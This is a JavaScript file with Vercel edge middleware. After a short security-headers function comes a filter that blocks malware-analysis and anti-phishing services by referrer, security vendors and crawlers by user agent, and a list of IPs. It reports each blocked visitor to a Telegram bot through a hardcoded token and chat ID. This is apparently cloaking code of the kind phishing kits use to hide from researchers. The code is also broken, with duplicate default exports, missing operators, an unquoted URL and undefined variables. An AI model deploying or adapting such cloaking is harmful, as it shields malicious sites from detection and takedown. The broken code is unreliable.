import { next } from '@vercel/edge';

export default function middleware(req) {
  return next({
    headers: {
      'Referrer-Policy': 'origin-when-cross-origin',
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'X-DNS-Prefetch-Control': 'on',
      'Strict-Transport-Security':
        'max-age=31536000; includeSubDomains; preload',
    },
  });
}
export default async function middleware(req) {
    const blockedIPs = [
        "82.165.47.1", "82.165.47.2", "82.165.47.3", "84.74.14.1", "66.249.71.179",
        "124.176.210.234", "125.18.56.109", "128.232.110.18", "137.108.145.10",
        "137.110.222.77", "138.26.64.54", "149.20.54.228", "66.166.75.114",
        "74.208.16.68", "74.125.183.23", "74.125.182.36", "149.20.54.136",
        "65.17.253.220", "69.163.205.29", "219.117.238.174", "69.20.70.31",
        "174.123.110.53", "91.199.104.3", "64.71.195.31", "66.65.156.74",
        "144.214.37.229", "84.14.214.213", "133.11.204.68", "125.14.226.143",
        "149.20.57.227", "149.20.54.227", "149.20.255.255", "66.77.136.1",
        "66.77.136.2", "66.77.136.3", "149.20.54.209", "69.171.1.1",
        "69.171.1.2", "209.85.224.1", "209.85.224.2", "209.85.255.1",
        "209.85.128.1", "66.150.14.1", "50.97.1.1", "209.235.1.1",
        "91.199.104.1", "115.160.1.1", "210.247.1.1", "195.214.1.1",
        "84.110.1.1", "178.25.1.1", "74.125.1.1", "69.63.176.1",
        "69.63.189.1", "128.242.99.77", "81.218.48.5", "128.242.99.72"
    ];

    const blockedUserAgents = [
        /bot/i, /crawler/i, /spider/i, /scanner/i, /ahrefs/i, /semrushbot/i,
        /Googlebot/i, /Chrome/i, /Kaspersky/i, /Avira/i, /McAfee/i,
        /Verisign/i, /Netcraft/i, /Spamcop/i
    ];

    const blockedReferrers = [
        "fromgoogle.com", "wepawet.iseclab.org", "websense.com",
        "vxvault.siri-urz.net", "tekdefense.com", "malc0de.com",
        "malwareblacklist.com", "minotauranalysis.com", "sacour.cn",
        "scoop.it", "tencent.com", "spyeyetracker.abuse.ch",
        "abuse.ch", "scumware.org", "sophos.com", "securebrain.co.jp",
        "quttera.com", "hosts-file.net", "amada.abuse.ch",
        "palevotracker.abuse.ch", "blogger.com", "phishtank.com",
        "netcraft.com", "google.com", "yahoo.com", "malwared.ru",
        "malware.com.br", "malekal.com", "k7computing.com", "gdata.com",
        "gdatasoftware.com", "fortinet.com", "emsisoft.com",
        "opera.com", "infospyware.com", "kaspersky.com"
    ];

    const clientIP = req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
    const userAgent = req.headers.get("user-agent") || "Unknown";
    const referrer = req.headers.get("referer") || "Unknown";
    const requestURL = req.url;

    // Check if IP, User-Agent, or Referrer is blocked
    const isBlockedIP = blockedIPs.includes(clientIP);
    const isBlockedUA = blockedUserAgents.some((ua) => ua.test(userAgent));
    const isBlockedReferrer = blockedReferrers.some((ref) => referrer.includes(ref));

    if (isBlockedIP  isBlockedUA  isBlockedReferrer) {
        // Log blocked attempt to Telegram
        await sendToTelegram(clientIP, userAgent, requestURL);

        return new Response("🔒 Access Denied", { status: 403 });
    }

    return new Response("✅ Access Allowed", { status: 200 });
}

// 🔹 Send Blocked Attempt to Telegram
async function sendToTelegram(ip, userAgent, url) {
    const TELEGRAM_BOT_TOKEN = "7756706006:AAFeJI-PAodEoxC-OMS1XHQFDv2XdR_tOFk";
const TELEGRAM_CHAT_ID = "6596338900";

    const message = `
🔒 *Blocked Attempt Detected!*
🕰️ *Timestamp:* \`${new Date().toISOString()}\`
🚨 *Blocked IP:* \`${ip}\`
🖥️ *User-Agent:* \`${userAgent}\`
🔗 *URL:* \`${url}\`
    `;

    const telegramURL = https://api.telegram.org/bot${botToken}/sendMessage;
    
    await fetch(telegramURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    }).catch(err => console.error("Telegram Error:", err));
}
